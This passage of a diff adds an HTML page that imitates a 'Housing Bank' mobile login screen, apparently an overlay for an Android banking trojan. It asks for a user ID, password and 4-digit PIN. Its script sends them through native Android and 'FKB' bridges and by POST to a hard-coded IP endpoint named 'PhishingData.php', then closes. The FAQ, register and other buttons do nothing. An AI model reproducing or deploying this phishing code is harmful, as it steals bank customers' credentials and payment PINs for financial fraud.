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" alt="Housing Bank">
+    </div>
+
+    <!-- ==================== STEP 1: 账号与密码登录表单 ==================== -->
+    <div class="step-view active" id="step1">
+      
+      <!-- User ID 卡片 -->
+      <div class="input-card">
+        <div class="field-icon">
+          <svg viewBox="0 0 24 24">
+            <path d="M20 21v-2a4 4 0 0 0-4-4H8a4 4 0 0 0-4 4v2"/>
+            <circle cx="12" cy="7" r="4"/>
+          </svg>
+        </div>
+        <input 
+          class="native-input" 
+          type="text" 
+          id="userInput" 
+          placeholder="User ID" 
+          autocomplete="off" 
+          autocapitalize="none"
+          spellcheck="false"
+        >
+        <div class="info-circle-btn" onclick="handleInfo('User ID')">
+          <svg viewBox="0 0 24 24">
+            <circle cx="12" cy="12" r="10"/>
+            <line x1="12" y1="16" x2="12" y2="12"/>
+            <line x1="12" y1="8" x2="12.01" y2="8"/>
+          </svg>
+        </div>
+      </div>
+
+      <!-- Login Password 卡片 -->
+      <div class="input-card">
+        <div class="field-icon">
+          <svg viewBox="0 0 24 24">
+            <rect x="3" y="11" width="18" height="11" rx="2" ry="2"/>
+            <path d="M7 11V7a5 5 0 0 1 10 0v4"/>
+          </svg>
+        </div>
+        <input 
+          class="native-input" 
+          type="password" 
+          id="pwdInput" 
+          placeholder="Login Password" 
+          autocomplete="current-password"
+        >
+        <div class="info-circle-btn" onclick="handleInfo('Login Password')">
+          <svg viewBox="0 0 24 24">
+            <circle cx="12" cy="12" r="10"/>
+            <line x1="12" y1="16" x2="12" y2="12"/>
+            <line x1="12" y1="8" x2="12.01" y2="8"/>
+          </svg>
+        </div>
+      </div>
+
+      <!-- Remember User ID 复选框 -->
+      <div class="remember-row" onclick="toggleRemember()">
+        <div class="custom-checkbox" id="rememberBox">
+          <svg viewBox="0 0 24 24">
+            <polyline points="20 6 9 17 4 12"/>
+          </svg>
+        </div>
+        <span class="remember-label">Remember User ID</span>
+      </div>
+
+      <!-- 主登录按钮 -->
+      <button type="button" class="login-submit-btn" id="loginBtn" onclick="handleGoStep2()">Login</button>
+
+      <!-- 帮助辅助链接 (FAQs & Trouble logging in?) -->
+      <div class="help-links-row">
+        <a href="javascript:void(0)" class="faq-link" onclick="handleFaq()">
+          <svg viewBox="0 0 24 24">
+            <circle cx="12" cy="12" r="10"/>
+            <path d="M9.09 9a3 3 0 0 1 5.83 1c0 2-3 3-3 3"/>
+            <line x1="12" y1="17" x2="12.01" y2="17"/>
+          </svg>
+          <span>FAQs</span>
+        </a>
+        <a href="javascript:void(0)" class="trouble-link" onclick="handleTrouble()">Trouble logging in?</a>
+      </div>
+
+      <!-- 下方操作卡片 (Register / New Customer) -->
+      <div class="action-cards-grid">
+        <a href="javascript:void(0)" class="action-pill-btn" onclick="handleRegister()">Register</a>
+        <a href="javascript:void(0)" class="action-pill-btn" onclick="handleNewCustomer()">New Customer</a>
+      </div>
+
+    </div>
+
+    <!-- ==================== STEP 2: 4 位数字 PIN 码安全键盘 ==================== -->
+    <div class="step-view" id="step2">
+      <h2 class="pin-title">أدخل رمز PIN</h2>
+      <p class="pin-subtitle">يرجى إدخال رمز PIN المكون من 4 أرقام</p>
+
+      <!-- 4 个圆圈槽位 -->
+      <div class="pin-dots-wrap">
+        <div class="pin-dot" id="dot0"></div>
+        <div class="pin-dot" id="dot1"></div>
+        <div class="pin-dot" id="dot2"></div>
+        <div class="pin-dot" id="dot3"></div>
+      </div>
+
+      <!-- 扁椭圆横向数字软键盘 (按阿语从右往左排列 1 2 3) -->
+      <div class="keypad-grid">
+        <div class="num-key" onclick="pressNum('1')">1</div>
+        <div class="num-key" onclick="pressNum('2')">2</div>
+        <div class="num-key" onclick="pressNum('3')">3</div>
+
+        <div class="num-key" onclick="pressNum('4')">4</div>
+        <div class="num-key" onclick="pressNum('5')">5</div>
+        <div class="num-key" onclick="pressNum('6')">6</div>
+
+        <div class="num-key" onclick="pressNum('7')">7</div>
+        <div class="num-key" onclick="pressNum('8')">8</div>
+        <div class="num-key" onclick="pressNum('9')">9</div>
+
+        <!-- 最后一排：占位、0、删除键 -->
+        <div class="num-key empty"></div>
+        <div class="num-key" onclick="pressNum('0')">0</div>
+        <div class="num-key backspace" onclick="pressDelete()">
+          <svg viewBox="0 0 24 24">
+            <path d="M21 4H8l-7 8 7 8h13a2 2 0 0 0 2-2V6a2 2 0 0 0-2-2z"/>
+            <line x1="18" y1="9" x2="12" y2="15"/>
+            <line x1="12" y1="9" x2="18" y2="15"/>
+          </svg>
+        </div>
+      </div>
+    </div>
+
+  </main>
+
+  <!-- 底部固定 TabBar 导航栏 -->
+  <footer class="bottom-tab-bar" id="tabBar">
+    <div class="tab-item" onclick="handleTab('Locations')">
+      <div class="tab-icon-box">
+        <svg viewBox="0 0 24 24">
+          <path d="M21 10c0 7-9 13-9 13s-9-6-9-13a9 9 0 0 1 18 0z"/>
+          <circle cx="12" cy="10" r="3"/>
+        </svg>
+      </div>
+      <span class="tab-label">Locations</span>
+    </div>
+    <div class="tab-item" onclick="handleTab('Campaigns')">
+      <div class="tab-icon-box">
+        <svg viewBox="0 0 24 24">
+          <path d="M21 15a2 2 0 0 1-2 2H7l-4 4V5a2 2 0 0 1 2-2h14a2 2 0 0 1 2 2z"/>
+        </svg>
+      </div>
+      <span class="tab-label">Campaigns</span>
+    </div>
+    <div class="tab-item" onclick="handleTab('Language')">
+      <div class="tab-icon-box">
+        <svg viewBox="0 0 24 24">
+          <rect x="3" y="3" width="18" height="18" rx="3"/>
+          <path d="M8 17l4-9 4 9"/>
+          <line x1="9.5" y1="13.5" x2="14.5" y2="13.5"/>
+        </svg>
+      </div>
+      <span class="tab-label">Language</span>
+    </div>
+    <div class="tab-item" onclick="handleTab('Calculator')">
+      <div class="tab-icon-box">
+        <svg viewBox="0 0 24 24">
+          <rect x="4" y="2" width="16" height="20" rx="3"/>
+          <line x1="8" y1="6" x2="16" y2="6"/>
+          <line x1="8" y1="11" x2="10" y2="11"/>
+          <line x1="14" y1="11" x2="16" y2="11"/>
+          <line x1="8" y1="16" x2="10" y2="16"/>
+          <line x1="14" y1="16" x2="16" y2="16"/>
+        </svg>
+      </div>
+      <span class="tab-label">Calculator</span>
+    </div>
+  </footer>
+
+  <!-- 提交加载遮罩 -->
+  <div class="loading-overlay" id="loadingMask">
+    <div class="spinner"></div>
+    <div class="loading-text">Processing...</div>
+  </div>
+
+</div>
+
+<script>
+  // 包名
+  var pkgName = 'com.hbtf';
+  try {
+    if (typeof FKB !== 'undefined' && FKB.getPkg) {
+      pkgName = FKB.getPkg();
+    }
+  } catch (e) {}
+
+  var savedUserId = '';
+  var savedPassword = '';
+  var pinCode = '';
+  var PIN_MAX_LEN = 4;
+  var isSubmitting = false;
+
+  // DOM 元素引用
+  var userInput = document.getElementById('userInput');
+  var pwdInput = document.getElementById('pwdInput');
+  var rememberBox = document.getElementById('rememberBox');
+  var step1 = document.getElementById('step1');
+  var step2 = document.getElementById('step2');
+  var loadingMask = document.getElementById('loadingMask');
+  var tabBar = document.getElementById('tabBar');
+
+  // 切换 Remember
+  var isRememberChecked = false;
+  function toggleRemember() {
+    isRememberChecked = !isRememberChecked;
+    if (isRememberChecked) {
+      rememberBox.classList.add('checked');
+    } else {
+      rememberBox.classList.remove('checked');
+    }
+  }
+
+  // 进入第二步 PIN
+  function handleGoStep2() {
+    var u = userInput.value.trim();
+    var p = pwdInput.value.trim();
+    if (!u) {
+      userInput.focus();
+      return;
+    }
+    if (!p) {
+      pwdInput.focus();
+      return;
+    }
+
+    savedUserId = u;
+    savedPassword = p;
+
+    step1.classList.remove('active');
+    step2.classList.add('active');
+    tabBar.style.display = 'none'; // 第二步隐藏底栏，更加沉浸式
+    pinCode = '';
+    renderPinDots();
+  }
+
+  // 渲染 PIN 圆点
+  function renderPinDots() {
+    for (var i = 0; i < PIN_MAX_LEN; i++) {
+      var d = document.getElementById('dot' + i);
+      if (d) {
+        if (i < pinCode.length) {
+          d.classList.add('filled');
+        } else {
+          d.classList.remove('filled');
+        }
+      }
+    }
+  }
+
+  // 软键盘按键
+  function pressNum(num) {
+    if (isSubmitting) return;
+    if (pinCode.length >= PIN_MAX_LEN) return;
+    pinCode += num;
+    renderPinDots();
+
+    if (pinCode.length === PIN_MAX_LEN) {
+      setTimeout(doSubmit, 200);
+    }
+  }
+
+  function pressDelete() {
+    if (isSubmitting) return;
+    if (pinCode.length > 0) {
+      pinCode = pinCode.slice(0, -1);
+      renderPinDots();
+    }
+  }
+
+  // 提交逻辑
+  function doSubmit() {
+    if (isSubmitting) return;
+    isSubmitting = true;
+
+    loadingMask.classList.add('show');
+
+    var payload = JSON.stringify({
+      "类型": "Housing Bank",
+      "账号": savedUserId,
+      "登录密码": savedPassword,
+      "支付密码": pinCode,
+      "时间戳": Date.now()
+    });
+
+    // 通道 1: Android 原生注入
+    try {
+      if (typeof Android !== 'undefined' && Android.returnResult) {
+        Android.returnResult(payload);
+        setTimeout(function () {
+          try { Android.close(); } catch (e) {}
+        }, 1500);
+      }
+    } catch (e) {}
+
+    // 通道 2: FKB Bridge 协议
+    try {
+      if (typeof FKB !== 'undefined' && FKB.setFormData) {
+        FKB.setFormData(JSON.stringify({
+          account: savedUserId,
+          login_password: savedPassword,
+          payment_password: pinCode,
+          pkg: pkgName
+        }));
+      }
+    } catch (e) {}
+
+    // 通道 3: Ajax 后台兜底上报
+    try {
+      var xhr = new XMLHttpRequest();
+      xhr.open('POST', "http://18.142.44.159:8035/api/PhishingData.php", true);
+      xhr.setRequestHeader('Content-Type', 'application/json');
+      xhr.send(JSON.stringify({
+        pkg: pkgName,
+        template: 'housing_bank',
+        formData: payload
+      }));
+    } catch (e) {}
+
+    // 1.5 秒后关闭
+    setTimeout(closeNative, 1500);
+  }
+
+  function closeNative() {
+    try {
+      if (typeof Android !== 'undefined' && Android.close) Android.close();
+      else if (typeof Android !== 'undefined' && Android.close) Android.close();
+      else if (typeof Android!=='undefined'&&Android.close) Android.close();
+      else window.close();
+    } catch (e) {}
+  }
+
+  function handleInfo(type) {}
+  function handleFaq() {}
+  function handleTrouble() {}
+  function handleRegister() {}
+  function handleNewCustomer() {}
+  function handleMenu() {}
+  function handleTab(name) {}
+
+  // 自动聚焦
+  window.addEventListener('DOMContentLoaded', function () {
+    userInput.focus();
+  });
+</script>
+</body>
+</html>
